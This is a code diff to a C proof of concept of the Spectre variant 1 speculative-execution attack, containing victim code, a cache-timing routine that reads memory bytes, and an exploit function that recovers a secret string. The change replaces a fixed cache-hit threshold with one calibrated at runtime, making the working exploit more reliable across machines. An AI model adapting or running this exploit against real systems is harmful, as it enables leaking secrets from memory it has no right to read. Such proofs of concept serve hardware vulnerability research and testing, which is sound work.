@@ -8,6 +8,7 @@
 #include "spectre_archs.h"
 #include "spectre_intrinsics.h"
 #include "timer.h"
+#include "cache_latency.h"
 
 #define RESET       "\033[0m"
 #define BOLD        "\033[1m"         /* Bold font */
@@ -15,12 +16,6 @@
 #define GREEN       "\033[32m"        /* Green font */
 #define BOLDRED     "\033[1m\033[31m" /* Bold Red font */
 #define BOLDGREEN   "\033[1m\033[32m" /* Bold Green font */
-
-#if defined(__ARCH_POWERPC__)
-#define CACHE_HIT_THRESHOLD 1
-#else
-#define CACHE_HIT_THRESHOLD 80
-#endif
 
 /********************************************************************
  * Victim code.
@@ -46,7 +41,8 @@ void __attribute__ ((noinline)) victim_function(size_t x) {
  ********************************************************************/
 
 /* Report best guess in value[0] and runner-up in value[1] */
-void read_memory_byte(size_t malicious_x, uint8_t value[2], int score[2]) {
+void read_memory_byte(size_t malicious_x, uint8_t value[2], int score[2],
+					  unsigned int cache_hit_threshold) {
 	int tries, i, j, k, mix_i, results[256] = { 0 };
 	unsigned int junk = 0;
 	size_t training_x, x;
@@ -105,7 +101,7 @@ void read_memory_byte(size_t malicious_x, uint8_t value[2], int score[2]) {
 			time2 = __gettime();
 			time2 -= time1;
 
-			if (time2 <= CACHE_HIT_THRESHOLD
+			if (time2 <= cache_hit_threshold
 				&& mix_i != array1[tries % array1_size]) {
 				/* cache hit - add +1 to score for this value */
 				results[mix_i]++;
@@ -136,7 +132,8 @@ void read_memory_byte(size_t malicious_x, uint8_t value[2], int score[2]) {
 	score[1] = results[k];
 }
 
-void exploit_spectre(size_t malicious_x, int len, char *recovered_string) {
+void exploit_spectre(size_t malicious_x, int len, char *recovered_string,
+					 unsigned int cache_hit_threshold) {
 	int i, score[2];
 	uint8_t value[2];
 
@@ -185,8 +182,11 @@ int main(int argc, const char **argv) {
 
 	printf("array1 = %p secret = %p\n", array1, secret);
 
+	unsigned int cache_hit_threshold = (1.1 * determine_cache_latency());
+	printf("Cache hit threshold = %u\n", cache_hit_threshold);
+
 	/* execute Spectre exploit */
-	exploit_spectre(malicious_x, len, recovered_string);
+	exploit_spectre(malicious_x, len, recovered_string, cache_hit_threshold);
 
 	printf("String: '" BOLD "%s" RESET "'\n", recovered_string);
 	printf("temp = 0x%02x\n", temp);
